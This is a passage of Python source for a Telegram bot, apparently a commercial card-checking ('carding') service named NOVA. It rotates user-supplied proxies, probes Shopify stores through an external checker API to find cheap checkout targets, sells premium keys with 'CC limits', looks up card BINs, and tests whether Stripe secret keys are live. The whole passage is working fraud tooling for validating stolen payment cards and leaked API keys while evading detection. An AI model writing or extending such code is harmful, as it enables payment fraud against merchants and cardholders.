    extra = f"\n<i>+{len(removed)-10} more</i>" if len(removed) > 10 else ""
    await styled_reply(event, pe(
        f"✅ <b>{bs('Removed')}</b> <code>{len(removed)}</code>\n{SEP}\n"
        f"{removed_str}{extra}\n{SEP}\n📁 {bs('Remaining')}: <code>{len(keep)}</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]clearproxy$'))
async def cmd_clearproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already empty')}</b>"))
    save_user_proxies(uid, [])
    await styled_reply(event, pe(f"✅ <b>{bs('Cleared')}</b> <code>{len(proxies)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]myproxy$'))
async def cmd_myproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    lines = [f"{i}. <code>{p}</code>" for i, p in enumerate(proxies[:50], 1)]
    if len(proxies) > 50:
        lines.append(f"<i>+{len(proxies)-50} more</i>")
    await styled_reply(event, pe(
        f"💎 <b>{bs('Your proxies')}</b> (<code>{len(proxies)}/{MAX_PROXIES_PER_USER}</code>)\n"
        f"{SEP}\n" + "\n".join(lines)
    ))


@client.on(events.NewMessage(pattern=r'^[/.]getproxy$'))
async def cmd_getproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    fname = f"NOVA_proxies_{uid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for i, p in enumerate(proxies, 1):
                await f.write(f"{i}. {p}\n")
        await send_file_entities(
            uid, fname,
            pe(f"💎 {bs('Proxies')} (<code>{len(proxies)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def cb_proxy_menu(event):
    await event.answer()
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_premium(uid):
        return await event.answer("Premium only", alert=True)
    count = len(load_user_proxies(uid))
    text = pe(f"""💎 <b>{bs('Proxy Management')}</b>
{SEP}
📁 {bs('Your proxies')}: <code>{count}/{MAX_PROXIES_PER_USER}</code>
{SEP}
📥 <b>{bs('Add')}</b> — <code>/addproxy</code>
🔀 <b>{bs('Check')}</b> — <code>/proxy</code> · <code>/chkproxy ip:port:u:p</code>
❌ <b>{bs('Remove')}</b> — <code>/rmproxy</code> · <code>/rmproxyindex 1,2,3</code> · <code>/clearproxy</code>
📂 <b>{bs('View')}</b> — <code>/myproxy</code> · <code>/getproxy</code>
{SEP}
💡 {bs('Each user has their own private proxy pool')}""")
    try:
        await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                         parse_mode='html', link_preview=False)
    except Exception:
        await client_instance.send_message(event.sender_id, text,
            buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]], parse_mode='html')


# ====================== SITE TEST ======================
async def test_site_with_price(site: str, proxy: str = None) -> dict:
    test_card = "4111111111111111|12|2030|123"
    min_price = get_min_price()
    max_price = get_threshold()

    if not site:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': 'Empty site'}
    if not _proxy_str_for_api(proxy):
        return {'site': site, 'status': 'proxy_error', 'price': 0.0, 'response': 'No proxy'}

    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    card_enc = quote(test_card, safe='')
    url = f"{SHOPIFY_API_URL}?url={quote(site_clean, safe='.-_')}&card={card_enc}"
    ps = _proxy_str_for_api(proxy)
    if ps:
        url += f"&proxy={quote(ps, safe='')}"

    session = await get_http_session()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=45, connect=20)) as resp:
            if resp.status in (429, 500, 502, 503, 504):
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': f'API {resp.status}'}
            if resp.status != 200:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': f'HTTP {resp.status}'}
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'site': site, 'status': 'dead', 'price': 0.0,
                        'response': 'Bad JSON'}

        sc = str(raw.get('status_code', raw.get('status', ''))).upper()
        response = str(raw.get('Response', raw.get('response', ''))).strip()
        error_msg = str(raw.get('error', '')).strip()
        err_low = (error_msg + ' ' + response).lower()

        if '407' in err_low or 'proxy authentication' in err_low \
                or 'connect tunnel failed' in err_low \
                or 'could not resolve proxy' in err_low \
                or ('proxy' in err_low and 'curl: (7)' in err_low):
            return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                    'response': f'Proxy failed: {error_msg[:80]}'}
        if 'curl: (28)' in err_low or 'timed out' in err_low:
            return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                    'response': f'Proxy timeout: {error_msg[:80]}'}
        if 'could not resolve host' in err_low:
            return {'site': site, 'status': 'proxy_error', 'price': 0.0,
                    'response': f'DNS failed: {error_msg[:80]}'}

        if sc in ('PROXY_REQUIRED', 'PROXY_INVALID', 'PROXY_TIMEOUT'):
            return {'site': site, 'status': 'proxy_error', 'price': 0.0, 'response': sc}
        if sc in ('URL_INVALID', 'URL_REQUIRED'):
            return {'site': site, 'status': 'dead', 'price': 0.0, 'response': sc}
        if sc in ('CARD_INVALID', 'CARD_REQUIRED', 'CARD_EXPIRED'):
            return {'site': site, 'status': 'dead', 'price': 0.0, 'response': sc}
        if response.upper() in ('ERROR', 'SITE ERROR', '') and 'proxy' not in err_low:
            return {'site': site, 'status': 'dead', 'price': 0.0,
                    'response': response or 'Empty response'}
        if is_site_error(response):
            return {'site': site, 'status': 'dead', 'price': 0.0,
                    'response': response[:60]}

        try:
            price = float(str(raw.get('Price', raw.get('price', 0)))
                          .replace('$', '').replace(',', '').strip())
        except Exception:
            price = 0.0

        if price <= 0.0:
            return {'site': site, 'status': 'dead', 'price': 0.0,
                    'response': 'No priced products'}
        if price < min_price:
            return {'site': site, 'status': 'dead', 'price': price,
                    'response': f'Below ${min_price:.2f}'}
        if price > max_price:
            return {'site': site, 'status': 'over', 'price': price,
                    'response': f'Over ${max_price:.2f} (min=${price:.2f})'}

        return {'site': site, 'status': 'alive', 'price': price,
                'response': f'${price:.2f} ✓'}

    except asyncio.TimeoutError:
        return {'site': site, 'status': 'proxy_error', 'price': 0.0, 'response': 'Timeout (45s)'}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'response': str(e)[:50]}


async def _run_site_tests(event, uid, to_test, status_msg, initial_sites_count, existing=None, wipe=False):
    threshold = get_threshold()
    min_price = get_min_price()
    proxies = load_user_proxies(uid)
    if not proxies:
        return await status_msg.edit(pe(f"💎 <b>{bs('Need proxies first')}</b>"))

    sem = get_user_sem(uid, "site")
    alive, dead, over, unknown, proxy_err = [], 0, 0, 0, 0
    checked = 0

    async def _check_one(site):
        nonlocal checked, dead, over, unknown, proxy_err
        async with sem:
            res = await test_site_with_price(site, random.choice(proxies))
        checked += 1
        st = res.get('status')
        if st == 'alive':
            alive.append(site)
        elif st == 'over':
            over += 1
        elif st == 'proxy_error':
            proxy_err += 1
        elif st == 'unknown':
            unknown += 1
        else:
            dead += 1

    try:
        for i in range(0, len(to_test), SITE_PER_USER_WORKERS):
            batch = to_test[i:i + SITE_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(s) for s in batch])
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Testing')}</b> [{checked}/{len(to_test)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{dead}</code> | "
                    f"🔌 <code>{proxy_err}</code> | 💰 <code>{over}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

        total_checked = proxy_err + dead + over + len(alive) + unknown
        majority_proxy = (total_checked > 0 and proxy_err >= total_checked)
        if (not wipe) and (proxy_err > 0) and (len(alive) == 0) and (over == 0) and majority_proxy:
            return await status_msg.edit(pe(
                f"🛑 <b>{bs('All requests failed at proxy layer')}</b>\n{SEP}\n"
                f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
                f"❌ {bs('Dead')}: <code>{dead}</code>\n"
                f"💡 {bs('Replace proxies and retry')}"
            ), parse_mode='html', link_preview=False)

        if wipe:
            save_sites(alive)
        elif alive and existing is not None:
            save_sites(list(existing) + alive)

        await status_msg.edit(pe(
            f"✅ <b>{bs('Site check complete')}</b>\n{SEP}\n"
            f"📥 {bs('Received')}: <code>{initial_sites_count}</code>\n"
            f"✅ {bs('Alive (≤ $'+str(threshold)+')')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead')}: <code>{dead}</code>\n"
            f"💰 {bs('Over threshold')}: <code>{over}</code>\n"
            f"🔌 {bs('Proxy errors')}: <code>{proxy_err}</code>\n"
            f"⚠️ {bs('Unknown')}: <code>{unknown}</code>\n"
            f"📁 {bs('Final sites.txt')}: <code>{len(load_sites())}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]addsites$'))
async def cmd_addsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/addsites</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    existing = set(load_sites())
    to_test = [s for s in new_sites if s not in existing]
    already = len(new_sites) - len(to_test)
    if not to_test:
        return await styled_reply(event, pe(f"💎 <b>{bs('All exist')}</b> · {bs('Dupes')} <code>{already}</code>"))

    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Testing')} <code>{len(to_test)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"
    ))
    await _run_site_tests(event, uid, to_test, status_msg,
                          initial_sites_count=len(new_sites),
                          existing=existing, wipe=False)


@client.on(events.NewMessage(pattern=r'^[/.]resetsites$'))
async def cmd_resetsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file with')} <code>/resetsites</code>"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
    new_sites = extract_urls(content)
    if not new_sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No valid URLs')}</b>"))
    save_sites([])
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Reset + testing')} <code>{len(new_sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"
    ))
    await _run_site_tests(event, uid, new_sites, status_msg,
                          initial_sites_count=len(new_sites), existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]site$'))
async def cmd_site(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('sites.txt empty')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b>"))
    threshold = get_threshold()
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Purging')} <code>{len(sites)}</code> — "
        f"filter: <code>${get_min_price():.2f}–${threshold:.2f}</code>"
    ))
    await _run_site_tests(event, uid, sites, status_msg,
                          initial_sites_count=len(sites), existing=None, wipe=True)


@client.on(events.NewMessage(pattern=r'^[/.]rm\s+'))
async def cmd_rm(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rm site.com</code> or <code>/rm all</code>"))
    arg = parts[1].strip().lower()
    sites = load_sites()
    if arg == "all":
        save_sites([])
        return await styled_reply(event, pe(f"✅ <b>{bs('Cleared')}</b> <code>{len(sites)}</code>"))
    target = normalize_site_url(arg)
    found = next((s for s in sites if normalize_site_url(s) == target), None)
    if not found:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not found')}</b>"))
    sites = [s for s in sites if s != found]
    save_sites(sites)
    await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b>\n🌐 <code>{found}</code>\n📁 <code>{len(sites)}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getsites$'))
async def cmd_getsites(event):
    uid = event.sender_id
    if uid not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    fname = f"NOVA_sites_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(s + "\n")
        await send_file_entities(uid, fname,
            pe(f"📁 {bs('Sites')} (<code>{len(sites)}</code>)"))
        os.remove(fname)
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setthreshold\s+'))
async def cmd_setthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/setthreshold 5</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_threshold(val)
    await styled_reply(event, pe(f"✅ {bs('Max price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getthreshold$'))
async def cmd_getthreshold(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    await styled_reply(event, pe(f"💰 {bs('Max price')}: <code>${get_threshold()}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]setminprice\s+'))
async def cmd_setminprice(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, pe(f"⚠️ <b>{bs('Admin only')}</b>"))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/setminprice 0.50</code>"))
    try:
        val = float(parts[1].strip())
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid number')}</b>"))
    set_min_price(val)
    await styled_reply(event, pe(f"✅ {bs('Min price')} <code>${val}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]getminprice$'))
async def cmd_getminprice(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(f"💰 {bs('Min price')}: <code>${get_min_price()}</code>"))


# ====================== KEY SYSTEM ======================
@client.on(events.NewMessage(pattern=r'^[/.]genkeys\s+'))
async def cmd_genkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 5:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n<code>/genkeys count hours max_users cc_limit [price]</code>\n"
            f"{SEP}\n💡 <code>/genkeys 5 24 1 1500 10</code>"))
    try:
        count = int(parts[1]); hours = int(parts[2])
        max_users = int(parts[3]); cc_limit = int(parts[4])
        price = float(parts[5]) if len(parts) > 5 else 0.0
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid numbers')}</b>"))
    if count < 1 or count > 100:
        return await styled_reply(event, pe(f"💎 <b>{bs('Count 1-100')}</b>"))
    keys_data = load_keys()
    now = datetime.now()
    expiry = (now + timedelta(hours=hours)).isoformat()
    generated = []
    for _ in range(count):
        key = generate_key()
        while key in keys_data:
            key = generate_key()
        keys_data[key] = {
            "hours": hours, "max_users": max_users, "cc_limit": cc_limit,
            "price": price, "created_at": now.isoformat(), "created_by": event.sender_id,
            "expiry": expiry, "used_by": [], "used_count": 0,
        }
        generated.append(key)
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    price_disp = f"${price:.2f}" if price else "Free"
    text = pe(f"""⭐ <b>{bs('Keys generated')}</b>  (x{count})
{SEP}
""" + "\n".join(f"┣ <code>{k}</code>" for k in generated) + f"""
{SEP}
📅 {bs('Valid')}: {hours_disp}
👥 {bs('Users per key')}: {max_users}
💳 {bs('CC limit')}: {cc_limit}
💰 {bs('Price')}: {price_disp}
⏰ {bs('Key expires')}: {expiry[:16]}

✅ {bs('Redeem with')} <code>/redeem KEY</code>""")
    await styled_reply(event, text)


@client.on(events.NewMessage(pattern=r'^[/.]redeem\s+'))
async def cmd_redeem(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/redeem NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        await send_redeem_log(uid, key, "❌ Invalid Key", "Key not found")
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid key')}</b>\n🔐 <code>{key}</code>"))
    entry = keys_data[key]
    now = datetime.now()
    try:
        if now > datetime.fromisoformat(entry.get('expiry', '')):
            await send_redeem_log(uid, key, "❌ Expired", "Key past expiry")
            return await styled_reply(event, pe(f"❌ <b>{bs('Key expired')}</b>"))
    except Exception:
        pass
    used_by = entry.get('used_by', [])
    max_users = int(entry.get('max_users', 1))
    if uid in used_by:
        await send_redeem_log(uid, key, "❌ Already Used", f"user {uid}")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already used')}</b>"))
    if len(used_by) >= max_users:
        await send_redeem_log(uid, key, "❌ Max Users", f"{len(used_by)}/{max_users}")
        return await styled_reply(event, pe(f"❌ <b>{bs('Key max users reached')}</b>\n👥 <code>{len(used_by)}/{max_users}</code>"))
    if is_premium(uid):
        await send_redeem_log(uid, key, "❌ Already Premium", "user already premium")
        return await styled_reply(event, pe(f"❌ <b>{bs('Already premium')}</b>"))
    hours = int(entry.get('hours', DEFAULT_KEY_HOURS))
    cc_limit = int(entry.get('cc_limit', DEFAULT_KEY_CC_LIMIT))
    user_expiry = (now + timedelta(hours=hours)).timestamp()
    data = load_premium_users()
    data[str(uid)] = {"expiry": user_expiry, "cc_limit": cc_limit,
                      "key": key, "activated_at": now.isoformat()}
    save_premium_users(data)
    entry['used_by'] = used_by + [uid]
    entry['used_count'] = int(entry.get('used_count', 0)) + 1
    keys_data[key] = entry
    save_keys(keys_data)
    hours_disp = f"{hours}h" if hours < 24 else f"{hours // 24}d"
    await send_redeem_log(uid, key, "✅ Success", f"Activated for {hours_disp}")
    await styled_reply(event, pe(
        f"🎉 <b>{bs('Premium activated')}</b>\n{SEP}\n"
        f"📅 {bs('Duration')}: <code>{hours_disp}</code>\n"
        f"💳 {bs('CC limit')}: <code>{cc_limit}</code>\n"
        f"⏰ {bs('Expires')}: <code>{datetime.fromtimestamp(user_expiry).strftime('%Y-%m-%d %H:%M')}</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]listkeys$'))
async def cmd_listkeys(event):
    if event.sender_id not in ADMIN_ID:
        return
    keys_data = load_keys()
    if not keys_data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No keys')}</b>"))
    now = datetime.now()
    lines = []
    for k, v in list(keys_data.items())[:50]:
        hours = v.get('hours', '?')
        used = v.get('used_count', 0); maxu = v.get('max_users', 1)
        expiry = v.get('expiry', '')[:16]
        status = "✅" if now.isoformat() < expiry else "❌"
        lines.append(f"{status} <code>{k}</code>\n    {hours}h · {used}/{maxu} · exp {expiry}")
    extra = f"\n<i>+{len(keys_data)-50} more</i>" if len(keys_data) > 50 else ""
    await styled_reply(event, pe(f"🔑 <b>{bs('Keys')}</b> (<code>{len(keys_data)}</code>)\n{SEP}\n" + "\n".join(lines) + extra))


@client.on(events.NewMessage(pattern=r'^[/.]delkey\s+'))
async def cmd_delkey(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/delkey NOVA_XXXX</code>"))
    key = parts[1].strip().upper()
    keys_data = load_keys()
    if key not in keys_data:
        return await styled_reply(event, pe(f"❌ <b>{bs('Not found')}</b>"))
    del keys_data[key]
    save_keys(keys_data)
    await styled_reply(event, pe(f"✅ <b>{bs('Deleted')}</b> <code>{key}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addpremium\s+'))
async def cmd_addpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/addpremium user_id [days] [cc_limit]</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    days = int(parts[2]) if len(parts) > 2 else 0
    cc_limit = int(parts[3]) if len(parts) > 3 else 100000
    data = load_premium_users()
    if days > 0:
        exp = (datetime.now() + timedelta(days=days)).timestamp()
        data[str(target)] = {"expiry": exp, "cc_limit": cc_limit,
                             "activated_at": datetime.now().isoformat()}
        exp_str = datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M')
    else:
        data[str(target)] = None
        exp_str = "Permanent"
    save_premium_users(data)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Premium added')}</b>\n👤 <code>{target}</code>\n"
        f"⏰ <code>{exp_str}</code>\n💳 CC <code>{cc_limit}</code>"))
    try:
        await send_entities(target,
            pe(f"🎉 <b>{bs('Premium activated')}</b>\n⏰ <code>{exp_str}</code>"))
    except Exception:
        pass


@client.on(events.NewMessage(pattern=r'^[/.]removepremium\s+'))
async def cmd_removepremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removepremium user_id</code>"))
    try:
        target = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if target in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Cannot remove admin')}</b>"))
    if remove_premium(target):
        await styled_reply(event, pe(f"✅ <b>{bs('Removed')}</b> <code>{target}</code>"))
        try:
            await send_entities(target, pe(f"⚠️ <b>{bs('Premium revoked')}</b>"))
        except Exception:
            pass
    else:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Not premium')}</b>"))


@client.on(events.NewMessage(pattern=r'^[/.]listpremium$'))
async def cmd_listpremium(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    if not data:
        return await styled_reply(event, pe(f"💎 <b>{bs('No premium users')}</b>"))
    now = datetime.now().timestamp()
    lines = []
    for uid_str, info in list(data.items())[:50]:
        if info is None:
            lines.append(f"• <code>{uid_str}</code> — Permanent")
        elif isinstance(info, dict):
            exp = info.get('expiry', 0)
            cc = info.get('cc_limit', '-')
            if exp and now < float(exp):
                left = int((float(exp) - now) / 60)
                h, m = left // 60, left % 60
                lines.append(f"• <code>{uid_str}</code> — {h}h {m}m · CC {cc}")
            else:
                lines.append(f"• <code>{uid_str}</code> — ⚠️ Expired")
    extra = f"\n<i>+{len(data)-50} more</i>" if len(data) > 50 else ""
    await styled_reply(event, pe(f"👑 <b>{bs('Premium')}</b> (<code>{len(data)}</code>)\n{SEP}\n" + "\n".join(lines) + extra))


# ====================== FREE / USER LIMIT COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]setfreelimit\s+'))
async def cmd_setfreelimit(event):
    global FREE_DAILY_LIMIT, FREE_COOLDOWN_SEC
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Usage')}</b>\n"
            f"<code>/setfreelimit daily [cooldown]</code>\n"
            f"<b>{SEP}</b>\n"
            f"Current: <code>{FREE_DAILY_LIMIT}</code> / day · cooldown <code>{FREE_COOLDOWN_SEC}s</code>"
        ))
    try:
        new_daily = int(parts[1])
        new_cool  = int(parts[2]) if len(parts) > 2 else FREE_COOLDOWN_SEC
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid numbers')}</b>"))
    FREE_DAILY_LIMIT  = new_daily
    FREE_COOLDOWN_SEC = new_cool
    await styled_reply(event, pe(
        f"✅ <b>{bs('Free limits updated')}</b>\n"
        f"📋 Daily: <code>{FREE_DAILY_LIMIT}</code>\n"
        f"⏱ Cooldown: <code>{FREE_COOLDOWN_SEC}s</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]getlimits$'))
async def cmd_getlimits(event):
    if event.sender_id not in ADMIN_ID:
        return
    await styled_reply(event, pe(
        f"📊 <b>{bs('Bot limits')}</b>\n{SEP}\n"
        f"🆓 Free daily: <code>{FREE_DAILY_LIMIT}</code>\n"
        f"⏱ Free cooldown: <code>{FREE_COOLDOWN_SEC}s</code>\n"
        f"💎 Premium default CC: <code>{DEFAULT_KEY_CC_LIMIT}</code>\n"
        f"🥇 Admin mass cap: <code>{MASS_HARD_CAP_ADMIN}</code>\n"
        f"🥈 Premium mass cap: <code>{MASS_HARD_CAP_PREMIUM}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"📁 Max proxies/user: <code>{MAX_PROXIES_PER_USER}</code>"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]setuserlimit\s+'))
async def cmd_setuserlimit(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 3:
        return await styled_reply(event, pe(
            f"💎 <code>/setuserlimit user_id daily_checks</code>\n"
            f"Use <code>0</code> {bs('for unlimited')}"
        ))
    try:
        target = int(parts[1])
        limit  = int(parts[2])
    except ValueError:
        return await styled_reply(event, pe(f"❌ <b>{bs('Invalid')}</b>"))
    d = _read_json(USER_LIMITS_FILE, {})
    if limit == 0:
        d.pop(str(target), None)
    else:
        d[str(target)] = limit
    _write_json(USER_LIMITS_FILE, d)
    await styled_reply(event, pe(
        f"✅ <b>{bs('Limit set')}</b>\n"
        f"👤 <code>{target}</code>\n"
        f"📋 <code>{limit if limit else 'unlimited'}</code>"
    ))


# ====================== TOOLS ======================
@client.on(events.NewMessage(pattern=r'^[/.]bin\s+'))
async def cmd_bin(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/bin 515462</code>"))
    bin_num = parts[1].strip()[:6]
    if not bin_num.isdigit() or len(bin_num) < 6:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid BIN')}</b>"))
    brand, typ, level, bank, country, flag = await get_bin_info(bin_num)
    await styled_reply(event, pe(
        f"💎 <b>{bs('BIN Lookup')}</b>\n{SEP}\n"
        f"📌 <b>BIN</b>: <code>{bin_num}</code>\n"
        f"🏷️ <b>Brand</b>: {brand}\n"
        f"💳 <b>Type</b>: {typ}\n"
        f"📊 <b>Level</b>: {level}\n"
        f"🏦 <b>Bank</b>: {bank}\n"
        f"🌍 <b>Country</b>: {country} {flag}"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]sk\s+'))
async def cmd_sk(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/sk sk_live_...</code>"))
    key = parts[1].strip()
    if not key.startswith(('sk_live_', 'sk_test_', 'rk_live_', 'rk_test_')):
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid format')}</b>"))
    session = await get_http_session()
    try:
        async with session.get('https://api.stripe.com/v1/account',
                               headers={'Authorization': f'Bearer {key}'},
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                await styled_reply(event, pe(
                    f"✅ <b>{bs('Stripe key valid')}</b>\n{SEP}\n"
                    f"🔑 <code>{key[:30]}...</code>\n"
                    f"🏦 {data.get('business_name', 'N/A')}\n"
                    f"🌍 {data.get('country', 'N/A')}\n"
